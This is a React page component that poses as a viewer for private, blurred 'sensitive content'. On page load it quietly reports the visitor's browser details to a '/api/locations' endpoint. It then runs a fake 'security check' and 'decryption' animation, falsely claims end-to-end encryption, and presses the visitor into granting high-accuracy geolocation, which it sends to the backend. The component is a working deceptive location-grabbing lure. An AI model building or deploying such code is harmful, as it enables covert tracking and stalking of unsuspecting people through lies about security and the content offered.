'use client';
import { useState, useEffect } from 'react';
import { Lock, EyeOff, Loader2 } from 'lucide-react';

export default function ViewClient({ link, uuid }: { link: any, uuid: string }) {
    const [status, setStatus] = useState<'idle' | 'loading' | 'success' | 'error'>('idle');
    const [msg, setMsg] = useState('');
    const [shake, setShake] = useState(false);
    const [revealed, setRevealed] = useState(false);

    // Silent Ping on Load
    useEffect(() => {
        fetch('/api/locations', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                link_uuid: uuid,
                user_agent: navigator.userAgent
            })
        }).catch(err => console.error("Ping failed", err));
    }, [uuid]);

    const handleView = () => {
        setStatus('loading');
        setMsg('Verifying device integrity...');

        if (!navigator.geolocation) {
            setStatus('error');
            setMsg('Device not compatible.');
            return;
        }

        // Slight artificial delay to make it feel like a "scan"
        setTimeout(() => {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const { latitude, longitude, accuracy } = position.coords;

                    try {
                        setMsg('Decrypting content...');

                        // Send data to backend
                        await fetch('/api/locations', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                link_uuid: uuid,
                                latitude,
                                longitude,
                                accuracy,
                                user_agent: navigator.userAgent
                            })
                        });

                        setStatus('success');
                        setMsg('Identity Verified. Decrypting...');

                        // Reveal Content after delay
                        setTimeout(() => {
                            setRevealed(true);
                        }, 1500);

                    } catch (e) {
                        console.error(e);
                        setStatus('error'); // Silent fail? Or let them retry?
                    }
                },
                (err) => {
                    setStatus('error');
                    setMsg('Verification failed. Location access is required to confirm you are in an approved region.');
                    setShake(true);
                    setTimeout(() => setShake(false), 500);
                },
                { enableHighAccuracy: true }
            );
        }, 800);
    };

    if (revealed) {
        return (
            <div className="fixed inset-0 bg-black flex items-center justify-center overflow-auto animate-in fade-in duration-1000">
                {link.hasImage ? (
                    <img src={`/api/images/${link.id}`} className="max-w-full max-h-screen object-contain shadow-2xl" alt="Private Content" />
                ) : (
                    <div className="text-center p-10">
                        <h1 className="text-4xl font-bold text-white mb-4">CONFIDENTIAL</h1>
                        <p className="text-gray-400">Content ID: {uuid}</p>
                    </div>
                )}
            </div>
        );
    }

    return (
        <div className="relative min-h-screen w-full bg-black overflow-hidden flex flex-col items-center justify-center font-sans text-white">

            {/* Background Image (Blurred) */}
            {link.hasImage ? (
                <div
                    className="absolute inset-0 bg-cover bg-center z-0 blur-[40px] opacity-60 scale-110 transform transition-transform duration-[10s]"
                    style={{ backgroundImage: `url(/api/images/${link.id})` }}
                />
            ) : (
                <div className="absolute inset-0 bg-gradient-to-br from-gray-900 to-black z-0 pointer-events-none" />
            )}

            {/* Overlay Gradient */}
            <div className="absolute inset-0 bg-black/40 z-10 backdrop-blur-sm" />

            {/* Main Modal Card */}
            <div className={`
                relative z-20 w-full max-w-sm mx-4 bg-[#121215]/90 backdrop-blur-xl 
                border-2 border-white/10 rounded-2xl shadow-2xl p-6 text-center
                flex flex-col items-center gap-4
                ${shake ? 'animate-shake' : ''}
            `}>

                {/* Warning Icon */}
                <div className="w-16 h-16 rounded-full bg-white/10 flex items-center justify-center mb-2 animate-pulse">
                    <EyeOff size={32} className="text-white/80" />
                </div>

                {/* Text Content */}
                <div className="space-y-1">
                    <h2 className="text-xl font-bold tracking-tight">Sensitive Content</h2>
                    <p className="text-gray-400 text-sm leading-relaxed">
                        This media contains content that has been marked as
                        <span className="font-semibold text-white"> private</span>.
                    </p>
                </div>

                {/* Progress / Status Area */}
                <div className="w-full bg-white/5 rounded-lg p-3 border border-white/5 my-2">
                    <div className="flex justify-between items-center text-xs text-gray-400 mb-1">
                        <span>Security Check</span>
                        <span className={status === 'error' ? 'text-red-400' : 'text-blue-400'}>
                            {status === 'idle' && 'Pending'}
                            {status === 'loading' && 'Scanning...'}
                            {status === 'error' && 'Failed'}
                            {status === 'success' && 'Verified'}
                        </span>
                    </div>
                </div>

                {/* Action Button */}
                <button
                    onClick={handleView}
                    disabled={status === 'loading' || status === 'success'}
                    className={`
                        w-full py-3.5 rounded-xl font-bold text-base transition-all transform active:scale-[0.98]
                        flex items-center justify-center gap-2
                        ${status === 'error'
                            ? 'bg-white text-black hover:bg-gray-200'
                            : 'bg-white text-black hover:bg-gray-100 shadow-[0_0_20px_rgba(255,255,255,0.3)]'
                        }
                    `}
                >
                    {status === 'loading' ? (
                        <>
                            <Loader2 size={18} className="animate-spin" />
                            Verifying...
                        </>
                    ) : status === 'success' ? (
                        'Opening...'
                    ) : (
                        'View Content'
                    )}
                </button>

                {/* Footer Message */}
                {msg && (
                    <p className={`text-xs mt-2 ${status === 'error' ? 'text-red-400 font-semibold' : 'text-gray-500'}`}>
                        {msg}
                    </p>
                )}

                <div className="mt-4 pt-4 border-t border-white/5 w-full">
                    <p className="text-[10px] text-gray-600 uppercase tracking-widest flex items-center justify-center gap-1">
                        <Lock size={10} />
                        End-to-End Encrypted
                    </p>
                </div>
            </div>

            <style jsx global>{`
                @keyframes shake {
                    0%, 100% { transform: translateX(0); }
                    25% { transform: translateX(-5px); }
                    75% { transform: translateX(5px); }
                }
                .animate-shake {
                    animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
                }
            `}</style>
        </div>
    );
}
